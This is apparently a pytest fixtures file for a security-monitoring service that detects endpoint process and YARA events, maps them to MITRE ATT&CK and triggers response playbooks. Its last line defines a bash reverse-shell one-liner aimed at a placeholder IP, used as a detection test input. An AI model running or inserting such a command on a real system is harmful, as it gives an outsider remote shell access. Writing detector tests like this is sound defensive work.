from __future__ import annotations

import uuid
from pathlib import Path

import pytest
from carylle.config import Secrets, Settings
from carylle.main import build_services, create_app
from carylle.models import EventType, NormalizedEvent, ProcessInfo
from carylle.pipeline.reasoning.llm_client import LLMResult
from carylle.pipeline.reasoning.mitre_mapper import MitreMapper
from carylle.security import derive_agent_token, generate_signing_keypair, new_secret
from fastapi.testclient import TestClient

ROOT = Path(__file__).resolve().parent.parent


class FakeLLM:
    """Stands in for LLMClient. Returns a fixed result, or calls a function of the prompt."""

    def __init__(self, result=None):
        self.result = result or LLMResult(status="disabled")
        self.prompts: list[str] = []

    def analyze(self, prompt: str) -> LLMResult:
        self.prompts.append(prompt)
        return self.result(prompt) if callable(self.result) else self.result


@pytest.fixture(scope="session")
def mapper() -> MitreMapper:
    return MitreMapper.load(ROOT / "data/mitre/enterprise-attack.json")


@pytest.fixture
def secrets() -> Secrets:
    signing, public = generate_signing_keypair()
    return Secrets(new_secret(), new_secret(), new_secret(), signing, public)


@pytest.fixture
def settings(tmp_path: Path) -> Settings:
    s = Settings()
    s.server.db_path = str(tmp_path / "carylle.db")
    s.server.ledger_anchor_path = str(tmp_path / "ledger.anchor")
    s.server.safelist_path = str(ROOT / "config/safelist.yaml")
    s.server.playbooks_path = str(ROOT / "config/playbooks/response_playbooks.yaml")
    s.server.mitre_path = str(ROOT / "data/mitre/enterprise-attack.json")
    s.llm.enabled = False
    s.response.mode = "autonomous"
    return s


@pytest.fixture
def services(settings, secrets, monkeypatch, mapper):
    # Parsing the 55 MB dataset once per session is enough.
    monkeypatch.setattr("carylle.main.MitreMapper.load", lambda _path: mapper)
    svc = build_services(settings, secrets, FakeLLM())
    yield svc
    svc.store.close()


class Harness:
    def __init__(self, client: TestClient, app, secrets: Secrets):
        self.client = client
        self.app = app
        self.secrets = secrets
        self.services = app.state.services
        self.operator = {"Authorization": f"Bearer {secrets.operator_token}"}

    def agent_headers(self, agent_id: str = "host-1") -> dict[str, str]:
        token = derive_agent_token(self.secrets.agent_master_secret, agent_id)
        return {"Authorization": f"Bearer {token}"}

    def post(self, events: list[dict], agent_id: str = "host-1") -> dict:
        response = self.client.post("/api/v1/events", json={"events": events}, headers=self.agent_headers(agent_id))
        assert response.status_code == 202, response.text
        self.app.state.worker_tick()
        return response.json()

    def cases(self) -> list[dict]:
        return self.client.get("/api/v1/cases", headers=self.operator).json()["cases"]

    def actions(self, **params) -> list[dict]:
        return self.client.get("/api/v1/actions", headers=self.operator, params=params).json()["actions"]

    def llm(self, result) -> None:
        self.services.engine.llm = FakeLLM(result)


@pytest.fixture
def make_harness(settings, secrets, monkeypatch, mapper):
    monkeypatch.setattr("carylle.main.MitreMapper.load", lambda _path: mapper)

    def build(mode: str = "autonomous") -> Harness:
        settings.response.mode = mode
        app = create_app(settings, secrets, llm=FakeLLM(), run_worker=False)
        client = TestClient(app)
        return Harness(client, app, secrets)

    return build


@pytest.fixture
def harness(make_harness) -> Harness:
    return make_harness()


def process_event(cmdline: str = "ls", **overrides) -> NormalizedEvent:
    """A normalized process event, for tests that skip the API."""
    event_id = overrides.pop("event_id", uuid.uuid4().hex)
    name = overrides.pop("name", cmdline.split()[0].rsplit("/", 1)[-1] if cmdline else "x")
    fields = {
        "pid": 4242,
        "ppid": 1000,
        "name": name,
        "exe": f"/usr/bin/{name}",
        "cmdline": cmdline,
        "user": "www-data",
        "create_time": 1000.5,
        "sha256": "a" * 64,
    }
    fields.update(overrides)
    return NormalizedEvent(
        event_id=event_id, agent_id="host-1", type=EventType.PROCESS_START, ts=1000.0, received_at=1000.0,
        process=ProcessInfo(**fields),
    )


def raw_process(cmdline: str, event_id: str | None = None, **overrides) -> dict:
    """A raw wire-format process event, as an agent would send it."""
    name = overrides.pop("name", cmdline.split()[0].rsplit("/", 1)[-1])
    data = {
        "pid": 4242,
        "ppid": 1000,
        "name": name,
        "exe": f"/usr/bin/{name}",
        "cmdline": cmdline,
        "user": "www-data",
        "create_time": 1000.5,
        "sha256": "a" * 64,
    }
    data.update(overrides)
    return {"event_id": event_id or uuid.uuid4().hex, "type": "process_start", "ts": 1000.0, "data": data}


def raw_yara(path: str = "/tmp/evil.bin", severity: str = "high", sha: str = "c" * 64) -> dict:
    return {
        "event_id": uuid.uuid4().hex,
        "type": "yara_match",
        "ts": 1000.0,
        "data": {"rule": "Test_Rule", "severity": severity, "attack": "T1505.003", "path": path, "sha256": sha, "size": 10},
    }


REVERSE_SHELL = "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1"
